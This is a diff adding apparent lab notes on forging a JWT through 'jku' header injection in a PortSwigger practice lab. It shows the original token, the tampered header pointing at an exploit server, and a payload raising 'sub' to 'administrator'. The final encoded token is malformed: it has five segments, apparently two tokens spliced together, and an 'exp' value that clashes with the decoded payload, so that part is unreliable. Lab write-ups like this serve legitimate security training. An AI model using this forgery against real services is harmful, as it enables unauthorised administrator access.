@@ -1,0 +1,38 @@
+Original JWT:
+    eyJraWQiOiIwNDY4Y2QzYi1lZTBjLTRlYmItOWQxOS02ZjA0MWRlY2MxNWMiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTczNzEyODAyNSwic3ViIjoid2llbmVyIn0.dxvfypjilror_HI1j8OWGkxYY5H3dH8iyzisuDe61M0xEmS4fXmIVCKWfYvJ5hMOI5GPEpusATNg0TrsNJMGGgvptO-DnYrryMNmvB67Lxe0yuxsR_Htou6p116O7eTVMWYQo0xsNu8Lhh9i26oqn-o8-k_4ydf2zwSRDonTBe42k8wF6PqEeFNfBIvUxPwLSnBKyiLflXSisOE5OrBewBs7PcgTNzwIFpFMKqPBnZ8R1y2oRsQdq_0dnPdnPstSZiyI6q8FxgJSCUu7W_OMalNTJFDi6asDyQlwyilq_8JiHp3bNyq8EqkkgA9hDvO-zfv4bgA38OxH7pdPJDsrvA
+
+Which, decoded, is:
+    HEADER
+    {
+        "kid": "0468cd3b-ee0c-4ebb-9d19-6f041decc15c",
+        "alg": "RS256"
+    }
+    PAYLOAD
+    {
+        "iss": "portswigger",
+        "exp": 1737128025,
+        "sub": "wiener"
+    }
+
+We now need to inject a "jku" header.
+We know by the lab's specifications that the URL is not validated, and we have the exploit server available.
+So we build the keys.json file (in this very same folder)
+
+We then replace the kid in the original jwt with one of the kid in the keys array and replace the "sub" field in the payload
+
+So, after tampering, we have the following JWT:
+    HEADER
+    {
+        "kid": "any-kid",
+        "alg": "RS256",
+        "jku": "https://exploit-0ad300d8047e32ff82f6238601c60079.exploit-server.net/exploit"
+    }
+    PAYLOAD
+    {
+        "iss": "portswigger",
+        "exp": 1737128025,
+        "sub": "administrator"
+    }
+
+Which, encoded, is:
+    eyJraWQiOiJhbnkta2lkIiwiYWxnIjoiUlMyNTYiLCJqa3UiOiJodHRwczovL2V4cGxvaXQtMGFkMzAwZDgwNDdlMzJmZjgyZjYyMzg2MDFjNjAwNzkuZXhwbG9pdC1zZXJ2ZXIubmV0L2V4cGxvaXQifQ.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTczNzEyODgxMiwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.CLe3wfG5qUXMGuRzHCMmcgeAy2dGfqbDMy3jgGfJKrSj7mw5h2_m14XFHbiVXdiqWcSYunSvRoY61CofYgdL909wY4NanNbGWqLo4RyC9jT9LPW2HNQK5LmUmKtUXZOtfdEdTO7fhervyUldwfIvGaMr9mDLMvilOmn71QJHrlddz2YJrcq6OM40StcyTdB3uDdNBYg1bt7M-mgRmKKCOtn4JKBq2ol14NMjPaLDpOASbKSBL1wfatPKUGjNg7w_EYIIPpOngivsiWhjFiN1elQrPNR-1XMpIx0H_6UxHvgsHI6UKCP252iPnKb6ZCDnWEENDGq4bSdm3WYndPkcqA.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTczNzEyODAyNSwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.2GN5cfmy4ltRp-84av2THpHRh3YwyNSdmf1qOHn2jPXeRrq_sf9AniqA4-0Yxs4cKwy7PM3ONGUrlXXQNr6RBJz8DaPj1jyS-b-7V5U5n3lRU6kK3IKR9pr9LpnvLX3uTVltCQJhvxXEicFKpg-7Upg4SQlYEQUNtDAdoZ5jr_omSvOREO0VynPjs_jTfjFRYa-lh1_jMcfE5ONJ9GEPnsXiOuPxyNOsMQi7Y9DYfaeJqxWYWnNIZN-vFjyJKF_9LRxhat4RNzQJRKY4wimMyAHa4v5C0zVjZeg3bEeboimh9klVRBAEs68q_SCLApltaWUNc5zq_7N5U31rlk0Ilw
